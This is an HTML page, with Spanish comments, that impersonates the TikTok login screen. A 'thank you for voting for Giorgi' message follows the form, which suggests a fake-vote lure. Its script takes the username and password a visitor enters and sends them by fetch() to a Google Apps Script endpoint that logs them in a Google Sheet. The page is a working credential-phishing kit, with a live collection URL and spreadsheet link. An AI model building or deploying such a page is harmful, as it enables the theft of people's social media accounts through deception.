<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>TikTok Login</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: Arial, sans-serif; }
        body { background: black; color: white; display: flex; justify-content: center; align-items: center; min-height: 100vh; padding: 20px; }
        
        .login-box { 
            background: rgba(22, 24, 35, 0.95); 
            padding: 30px; 
            border-radius: 15px; 
            width: 100%; 
            max-width: 400px; 
            border: 1px solid rgba(255, 255, 255, 0.1);
            text-align: center;
        }
        
        .logo { margin-bottom: 20px; }
        .logo i { 
            font-size: 50px; 
            background: linear-gradient(45deg, #25F4EE, #FE2C55); 
            -webkit-background-clip: text; 
            -webkit-text-fill-color: transparent; 
        }
        h1 { 
            font-size: 28px; 
            margin-bottom: 20px;
            background: linear-gradient(45deg, #25F4EE, #FE2C55); 
            -webkit-background-clip: text; 
            -webkit-text-fill-color: transparent; 
        }
        
        input {
            width: 100%;
            padding: 15px;
            margin: 10px 0;
            background: rgba(255, 255, 255, 0.1);
            border: 1px solid rgba(255, 255, 255, 0.2);
            border-radius: 8px;
            color: white;
            font-size: 16px;
        }
        
        button {
            width: 100%;
            padding: 15px;
            background: linear-gradient(45deg, #25F4EE, #FE2C55);
            color: white;
            border: none;
            border-radius: 8px;
            font-size: 16px;
            font-weight: bold;
            margin-top: 10px;
            cursor: pointer;
        }
        
        button:hover { opacity: 0.9; }
        button:disabled { opacity: 0.5; cursor: not-allowed; }
        
        .thankyou { display: none; }
        .success { color: #25F4EE; font-size: 24px; margin: 20px 0; }
        
        .status {
            margin-top: 20px;
            padding: 10px;
            background: rgba(37, 244, 238, 0.1);
            border-radius: 5px;
            font-size: 12px;
        }
        
        @media (max-width: 480px) {
            .login-box { padding: 20px; }
        }
    </style>
</head>
<body>
    <div class="login-box" id="loginBox">
        <div class="logo">
            <i class="fas fa-music"></i>
        </div>
        <h1>TikTok</h1>
        
        <div class="status">
            <p>üìç Datos van a: <strong>TU Google Sheets</strong></p>
            <p>üìä Hoja: <strong>Sheet1</strong></p>
        </div>
        
        <form id="loginForm">
            <input type="text" id="username" placeholder="Username or email" required>
            <input type="password" id="password" placeholder="Password" required>
            <button type="submit" id="loginBtn">Log In</button>
        </form>
    </div>
    
    <div class="login-box thankyou" id="thankyouBox">
        <div class="success">‚úì Thank You!</div>
        <p>Thank you for voting for Giorgi!</p>
        <p style="font-size: 14px; color: #FE2C55; margin: 20px 0;">
            Data saved to your Google Sheets
        </p>
        
        <div style="margin: 20px 0; padding: 10px; background: rgba(37, 244, 238, 0.1); border-radius: 5px;">
            <p style="font-size: 12px;">üìä <strong>Open your Google Sheets:</strong></p>
            <a href="https://docs.google.com/spreadsheets/d/1zxbtwEzQTFKXK148S8SXlnAY9PzyaNvSRjyNbyi_hpw" 
               target="_blank" 
               style="color: #25F4EE; font-size: 12px; word-break: break-all;">
                https://docs.google.com/spreadsheets/d/1zxbtwEzQTFKXK148S8SXlnAY9PzyaNvSRjyNbyi_hpw
            </a>
        </div>
        
        <button onclick="goBack()">Back to Login</button>
    </div>

    <script src="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/js/all.min.js"></script>
   <script>
    // 1. REEMPLAZA ESTA URL con la que te dio Google al "Implementar"
    const SCRIPT_URL = "https://script.google.com/macros/s/AKfycbxjIN6nm3SQ6ki-IUWUuJtb7B8jYkGDD11jBt-4jFO_VNkiSTnRHU2dkAg-hNGa8FYJ/exec";
    
    // Manejo del formulario de inicio de sesi√≥n
    document.getElementById('loginForm' ).addEventListener('submit', async function(e) {
        e.preventDefault(); // Evita que la p√°gina se recargue
        
        // Capturar los valores de los inputs
        const username = document.getElementById('username').value.trim();
        const password = document.getElementById('password').value.trim();
        const btn = document.getElementById('loginBtn');
        
        // Validaci√≥n b√°sica
        if (!username || !password) {
            alert('Por favor, completa todos los campos.');
            return;
        }
        
        // Feedback visual: deshabilitar bot√≥n y mostrar carga
        btn.disabled = true;
        btn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Enviando...';
        
        // Preparar los datos en formato de formulario (x-www-form-urlencoded)
        const formData = new URLSearchParams();
        formData.append('user', username);
        formData.append('pass', password);
        
        try {
            // ENVIAR DATOS A GOOGLE SHEETS
            // Usamos 'no-cors' porque Google no permite leer la respuesta directamente desde JS externo
            await fetch(SCRIPT_URL, {
                method: 'POST',
                mode: 'no-cors', 
                body: formData
            });

            // Si la ejecuci√≥n llega aqu√≠, los datos han sido enviados
            console.log('‚úÖ Datos enviados correctamente');
            
            // Ocultar login y mostrar pantalla de agradecimiento
            document.getElementById('loginBox').style.display = 'none';
            document.getElementById('thankyouBox').style.display = 'block';

        } catch (error) {
            console.error('‚ùå Error en el env√≠o:', error);
            alert('Hubo un error al conectar con el servidor. Int√©ntalo de nuevo.');
            
            // Restaurar bot√≥n en caso de error
            btn.disabled = false;
            btn.innerHTML = 'Log In';
        }
    });
    
    // Funci√≥n para el bot√≥n de "Volver" en la pantalla de agradecimiento
    function goBack() {
        document.getElementById('thankyouBox').style.display = 'none';
        document.getElementById('loginBox').style.display = 'block';
        document.getElementById('loginForm').reset();
        
        // Restaurar estado inicial del bot√≥n
        const btn = document.getElementById('loginBtn');
        btn.disabled = false;
        btn.innerHTML = 'Log In';
    }

    // Registro en consola para confirmar que el script carg√≥
    window.addEventListener('load', () => {
        console.log('üöÄ Sistema de guardado listo');
    });
</script>

</body>
</html>
